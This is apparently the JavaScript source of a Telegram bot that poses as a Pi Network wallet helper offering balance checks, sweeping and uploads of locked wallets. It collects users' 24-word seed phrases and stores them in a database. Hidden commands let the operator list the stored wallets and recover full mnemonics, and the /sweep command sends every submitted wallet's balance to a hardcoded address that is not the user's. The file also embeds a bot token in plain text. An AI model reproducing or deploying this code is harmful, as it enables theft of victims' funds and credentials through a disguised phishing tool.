import TelegramBot from "node-telegram-bot-api";
import { getAccount, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
import { connectToDB } from "./db.js";
import Sponsors from "./models/Sponsors.js";
import Passphrase from "./models/Passphrase.js";
import { formatReadableTimeString, splitMessage, timeAgoOrInString } from "./utils/helper.js";

const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
console.log('Bot is running')



const bot = new TelegramBot(token, { polling: true });
await connectToDB();

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome to PiMasterBot! Type /help to see commands, created by @fritzdecode");
})

bot.onText(/\/help/, (msg) => {
    const helpText = `
        💼 Team: *C2GEN*
        📘 PiBot Commands:
        /balance - Show Pi balance
        /claim - Claim unlocked Pi
        /search - Check if a wallet exists
        /sweep - sweeps all available pi
        /uploadWallet - Upload a locked pi wallet with your valid wallet address
        /listWallets - Show all your uploaded wallet
        /stop - stops all running process
        `;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

const userSessions = {};

bot.onText(/\/claim/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Not available on *demo*', { parse_mode: 'Markdown' });
});

bot.onText(/\/search/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G*', { parse_mode: 'Markdown' });

    userSessions[chatId] = { SearchingForWallet: true }
});

bot.onText(/\/searchp/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G*', { parse_mode: 'Markdown' });

    userSessions[chatId] = { SearchingForWalletP: true }
});

bot.onText(/\/searchSponsor/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G*', { parse_mode: 'Markdown' });

    userSessions[chatId] = { SearchingForASponsor: true }
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) OR Pi Wallet address');

    userSessions[chatId] = { waitingForPassphraseForBalance: true }
});


bot.onText(/\/sweep/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) to start sweeping');

    userSessions[chatId] = { waitingForPassphraseForSweeping: true, stopAll: false }
});

bot.onText(/\/uploadWallet/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by the wallet address.\n\nFormat:\n`word1 word2 ... word24 G...`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForPassphraseAndAddress: true };
});

bot.onText(/\/deleteWallet/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase.\n\nFormat:\n`word1 word2 ... word24`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForDeletePassphrase: true };
});

bot.onText(/\/deleteSponsor/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase.\n\nFormat:\n`word1 word2 ... word24`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForDeleteSponsor: true };
});


bot.onText(/\/listWallets/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please enter your wallet address');
    userSessions[chatId] = { waitingForMyWalletAddress: true };
});

bot.onText(/\/listSpnsrs/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const sponsors = await Sponsors.find();

    if (sponsors.length === 0) {
        return bot.sendMessage(chatId, '❌ No sponsors found.');
    }

    const estimatedSeconds = sponsors.length; // 1s per sponsor
    bot.sendMessage(chatId, `⏳ Fetching balances for *${sponsors.length} sponsors*. Estimated time: *~${estimatedSeconds} seconds*`, {
        parse_mode: 'Markdown',
    });

    let lastUpdateTime = Date.now();
    let completed = 0;
    const progressMessage = async () => {
        const now = Date.now();
        if (now - lastUpdateTime > 5000 || completed % 5 === 0) {
            lastUpdateTime = now;
            await bot.sendMessage(chatId, `🔄 Progress: *${completed} of ${sponsors.length}* sponsors fetched...`, {
                parse_mode: 'Markdown',
            });
        }
    };


    bot.sendMessage(chatId, `⏳ Please wait while we fetch your sponsors...`)

    const list = await Promise.all(
        sponsors.map((s, index) =>
            new Promise((resolve) => {
                setTimeout(async () => {
                    try {
                    const kp = getKeypairFromPassphrase(s.mnemonic);
                    const accountData = await getAccount(kp.publicKey());

                    const balanceString = getBalance(accountData);
                    const balance = Math.max(parseFloat(balanceString) - 0.98, 0);

                    const phraseShort = s.mnemonic?.length > 14
                        ? `${s.mnemonic.slice(0, 7)}....${s.mnemonic.slice(-7)}`
                        : 'Unknown';

                    resolve(`${index + 1}. ${phraseShort} - *${balance.toFixed(7)} PI*`);
                        completed++;
                        progressMessage();
                    } catch (e) {
                    console.log(e);
                    resolve(`${index + 1}. ${s.username || s.name || 'Unknown'} - ⚠️ Failed to fetch balance`);
                    }
                    
                }, index * 1005); // Stagger by 1 second per sponsor
            })
        )
    );

    const message = list.join('\n');

    
    bot.sendMessage(chatId, `📋 *List of Sponsors:*\n\n${message}`, {
      parse_mode: 'Markdown',
    });

  } catch (err) {
    console.error('Error fetching sponsors:', err);
    bot.sendMessage(chatId, '⚠️ Failed to fetch sponsors. Try again later.');
  }
});

bot.onText(/\/listPhrs/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const passphrases = await Passphrase.find().sort({ claimableAt: 1 });

    if (passphrases.length === 0) {
      return bot.sendMessage(chatId, '❌ No wallet found.');
    }

    console.log(`Listing your wallets...`);
    await bot.sendMessage(chatId, `⏳ Please wait while we fetch your wallets...`)

    const list = await Promise.all(passphrases.map(async (p, index) => {
        if(!p.mnemonic) {
            await Passphrase.findByIdAndDelete(p._id);
            return null;
        }
        const kp = getKeypairFromPassphrase(p.mnemonic);
        const phraseShort = `${p.mnemonic.slice(0, 7)}....${p.mnemonic.slice(-7)}`;
        const baseMsg = `${index + 1}. ${phraseShort || 'Unknown'} --_${p.status}_`;
        if(!p.claimableAt) {
            return baseMsg + `\n ✅ PubKey: ${kp.publicKey()}` + '\n\n';
        }
        return  `${baseMsg}\n Locked coin: *${p.amount} PI*, Time *${formatReadableTimeString(p.claimableAt)} (${timeAgoOrInString(p.claimableAt)})*\n ✅ PubKey: ${kp.publicKey()} \n\n`;
    }));
    const cleanList = list.filter(Boolean);

    const message = cleanList.join('\n');

    const chunks = splitMessage(message);
    console.log(chunks)
    for (const chunk of chunks) {
        await bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${chunk}`, {
            parse_mode: 'Markdown',
        });
    }
    

  } catch (err) {
    console.error('Error fetching wallets:', err);
    bot.sendMessage(chatId, '⚠️ Failed to fetch wallets. Try again later.');
  }
});


bot.onText(/\/uploadSponsor/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by label.\n\nFormat:\n`word1 word2 ... word24 name`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForPassphraseAndName: true };
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Stopping any running process');

    userSessions[chatId]['stopAll'] = true;
});


// Upload passphrase
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.waitingForPassphraseAndAddress) {
        const parts = text.split(/\s+/);
        const address = parts[parts.length - 1];
        const passphraseWords = parts.slice(0, -1);

        if(passphraseWords.length !== 24 || !/^G[A-Z2-7]{55}$/.test(address)) {
            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a valid wallet address (starts with G...)');
        }

        const passphrase = passphraseWords.join(' ');
        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {
            const kp = getKeypairFromPassphrase(passphrase);
            const publicKey = kp.publicKey();

            const accountData = await getAccount(publicKey);

            const getReceiverAddressData = await getAccount(address);

            if(!accountData) {
                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
            }

            if(!getReceiverAddressData) {
                return bot.sendMessage(chatId, `❌ Invalid Wallet address`);
            }

            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
            
            const saved = await storeLockedPi(passphrase, publicKey, address)
            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
        }

        delete userSessions[chatId];
    }
});

// List my passphrase
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.waitingForMyWalletAddress) {
        try {
            const passphrases = await Passphrase.find({ receiverAddress: text });

        if (passphrases.length === 0) {
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        bot.sendMessage(chatId, `⏳ Please wait while we fetch your wallets...`)

        const list = await Promise.all(passphrases.map(async (p, index) => {
            if(!p.mnemonic) {
                await Passphrase.findByIdAndDelete(p._id);
                return null;
            }
            const phraseShort = `${p.mnemonic.slice(0, 7)}....${p.mnemonic.slice(-7)}`;

            return `${index + 1}. ${phraseShort || 'Unknown'} - Locked coin: *${p.amount} PI* --_${p.status}_`;
        }));
        const cleanList = list.filter(Boolean);

        const message = cleanList.join('\n');

    
        bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${message}`, {
            parse_mode: 'Markdown',
        });

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Search for wallet
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.SearchingForWallet) {
        try {
            const passphrases = await Passphrase.find();

        if (passphrases.length === 0) {
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        const existing = passphrases.find(phrase => {
            const kp = getKeypairFromPassphrase(phrase.mnemonic);
            return kp.publicKey() === text;
        });

        if(existing) {
            delete userSessions[chatId];
            const lockedPi = existing.amount ? `locked ${existing.amount} PI` : 'No locked PI'
            return bot.sendMessage(chatId, `✅ Matching wallet with *${lockedPi}* found.`, { parse_mode: 'Markdown' });
            
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `❌ No matching wallet found.`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Search for wallet Mnemonic
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.SearchingForWalletP) {
        try {
            const passphrases = await Passphrase.find();

        if (passphrases.length === 0) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        const existing = passphrases.find(phrase => {
            const kp = getKeypairFromPassphrase(phrase.mnemonic);
            return kp.publicKey() === text;
        });

        if(existing) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, `✅ Matching wallet mnemonic: *${existing.mnemonic}*`, { parse_mode: 'Markdown' });
            
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `❌ No matching wallet found.`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Search for sponsor Mnemonic
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.SearchingForASponsor) {
        try {
            const passphrases = await Sponsors.find();

        if (passphrases.length === 0) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        const existing = passphrases.find(phrase => {
            const kp = getKeypairFromPassphrase(phrase.mnemonic);
            return kp.publicKey() === text;
        });

        if(existing) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, `✅ Matching wallet mnemonic: *${existing.mnemonic}*`, { parse_mode: 'Markdown' });
            
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `❌ No matching wallet found.`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Delete selected passphrase
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.waitingForDeletePassphrase) {
        try {
            const kp = getKeypairFromPassphrase(text);
            const deleted = await Passphrase.findOneAndDelete({ mnemonic: text });

            bot.sendMessage(chatId, `✅ Public Key: ${kp.publicKey()}`)

        if (!deleted) {
            return bot.sendMessage(chatId, `❌ Passphrase not found...`)
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `✅ Passphrase deleted...`)


        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Delete selected sponsor
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.waitingForDeleteSponsor) {
        try {
            const kp = getKeypairFromPassphrase(text);
            const deleted = await Sponsors.findOneAndDelete({ mnemonic: text });

            bot.sendMessage(chatId, `✅ Public Key: ${kp.publicKey()}`)

        if (!deleted) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, `❌ Sponsor not found...`)
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `✅ Sponsor deleted...`)


        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if(userSessions[chatId]?.waitingForPassphraseAndName) {
        const parts = text.split(/\s+/);
        const name = parts[parts.length - 1];
        const passphraseWords = parts.slice(0, -1);

        if(passphraseWords.length !== 24) {
            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a name');
        }

        if(name.length < 3) {
            return bot.sendMessage(chatId, '❌ Name must be 3 or more characters')
        }

        const passphrase = passphraseWords.join(' ');
        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {
            const kp = getKeypairFromPassphrase(passphrase);
            const publicKey = kp.publicKey();

            const accountData = await getAccount(publicKey);

            if(!accountData) {
                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
            }

            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
            
            const saved = await storeSponsor(passphrase, name)
            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Ensure passphrase is correct.`);
            delete userSessions[chatId];
        }
        delete userSessions[chatId];
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if(userSessions[chatId]?.waitingForPassphraseForSweeping) {
        while(!userSessions[chatId]?.stopAll) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);
            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Sweeping Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Sender: ${kp.publicKey()}`);
                bot.sendMessage(chatId, `✅ Receiver: GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS`);

                const accountData = await getAccount(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;

                if(balance - 0.01 <= 0) {
                    bot.sendMessage(chatId, `❌ Insufficient Balance: ${balance.toFixed(7)} PI`);
                } else {
                    const result = await sweepWallet(passphrase, MAIN_ADDRESS);
                    if(result.data && result.data.hash) {
                        bot.sendMessage(chatId, `✅ ${result.amount} PI sweeped`);
                    } else {
                        bot.sendMessage(chatId, `❌ Sweeping failed`);
                    }
                }
            } catch(error) {
                bot.sendMessage(chatId, `❌ Something went wrong, please try again`);
            }

            await sleep(1000);
        }

        delete userSessions[chatId]
    }
})


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    try {
        if(userSessions[chatId]?.waitingForPassphraseForBalance) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);

            if(words.length === 1) {
                bot.sendMessage(chatId, '⏳ Checking validity of the address');
                const accountData = await getAccount(passphrase.toUpperCase());
                if(!accountData.balances) {
                    return bot.sendMessage(chatId, '❌ Invalid wallet. Please send address starting with G....');
                } else {
                    const balanceString = getBalance(accountData);
                    const balance = parseFloat(balanceString) - 0.98;
                    return bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
                }
            }

            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Checking Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);

                const accountData = await getAccount(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;
                bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
            } catch(error) {
                bot.sendMessage(chatId, `❌ Failed to fetch balance. Please try again`);
            }

            // delete userSessions[chatId]
        }
    } catch(err) {
        delete userSessions[chatId]
        return bot.sendMessage(chatId, `❌ Unknown error occured`);
    }
})



